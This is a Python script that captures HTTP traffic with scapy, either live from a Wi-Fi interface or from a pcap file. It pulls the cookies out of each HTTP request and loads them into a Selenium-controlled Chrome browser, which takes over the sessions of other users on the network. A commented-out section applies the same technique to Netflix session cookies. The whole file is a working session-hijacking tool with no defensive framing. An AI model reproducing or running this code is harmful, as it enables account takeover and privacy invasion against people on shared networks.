'''
parses live stream or user input pcap file.
Finds HTTPRequest packets.
Identfies the URL and idividual cookies within packet.
replaces the cookies from the browser with cookies from packets
refresh the page
'''


#started off with this tutorial for live capture function: https://www.youtube.com/watch?v=WMmVheaE0xE

import sys
import os
import scapy.all as scapy  #can use pip scapy install - be sure to add to path manager if using IDE
from scapy.layers import http as s_http #pip install scapy_http
from selenium import webdriver
from selenium.webdriver.common.keys import Keys




PATH = os.getcwd()
capture = PATH + '\\test.pcap'
driver = webdriver.Chrome(PATH + "\\chromedriver.exe")
#driver.maximize_window()

def live_capture():
    #https://stackoverflow.com/questions/10729116/adding-a-module-specifically-pymorph-to-spyder-python-ide
    interface = scapy.IFACES.dev_from_index(7) #7 is the index for the wifi interface on my computer
    scapy.sniff(iface= interface, store=False, prn = parse_packet)


#offline read pcap file
def offline_parse(capture):
    packets = scapy.sniff(offline = capture, prn = parse_packet)



def parse_packet(p): #callback function for each packet in capture   
    if(p.haslayer('HTTPRequest')): 
        # if this packet is an HTTP Request
        # get the requested URL
        url = p.Host.decode()# + p.Path.decode()
       # print(url)
        #p.show()
        if(p.Cookie):
            pkt_cookies_dict = {}
            pkt_cookies = p.Cookie.decode() #string type
            pkt_cookies = pkt_cookies.split(";")
            num_cookies = len(pkt_cookies)

            #open tab
            #driver.find_element_by_tag_name('body').send_keys(Keys.CONTROL + 't')
            #open webpage from packet cookies extracted from, get a copy of cookies when not logged in
            driver.get('http://' + url)
            browser_cookies = driver.get_cookies()
            
            #create pkt_cookies as a dictionary file from string type
            for c in range(num_cookies):
                tmp_list = pkt_cookies[c].split("=", 1)
                pkt_cookies_dict[tmp_list[0]] = tmp_list[1]

            num_bcookies = len(browser_cookies)

            #if packet cookie has same cookie name as browser cookie, change browser cookie to match the value extracted from packet
            for c in range(num_bcookies):
                for k,v in pkt_cookies_dict.items():
                    if(browser_cookies[c]['name'] == k):
                        browser_cookies[c]['value'] = v      
                for key,value in browser_cookies[c].items():                                                                      
                        if(type(value) == float):
                            browser_cookies[c][key] = int(browser_cookies[c][key])

            #delete all browser cookies and replace with updated cookie values extracted from packet
            driver.delete_all_cookies()
            for c in range(num_bcookies):
                driver.add_cookie(browser_cookies[c])
            driver.refresh() #refresh page
             
    
offline_parse(capture)
#live_capture()    


#netflix example: replace "netflixid" and "secure_id" with your session values
#driver.get('https://www.netflix.com')
#cookies = driver.get_cookies()
#num_cookies = len(cookies)
#for c in range(num_cookies):
#    for key,value in cookies[c].items(): 
#        if(key == 'expiry'):
#            cookies[c]['expiry'] = int(cookies[c]['expiry'])
#        if(value == 'NetflixId'):
#            cookies[c]['value'] = netflixid
#        if(value == 'SecureNetflixId'):
#            cookies[c]['value'] = secure_id
#
##print(cookies)
#driver.delete_all_cookies()
#for c in range(num_cookies):
#    print(c)
#    driver.add_cookie(cookies[c])
#driver.refresh()
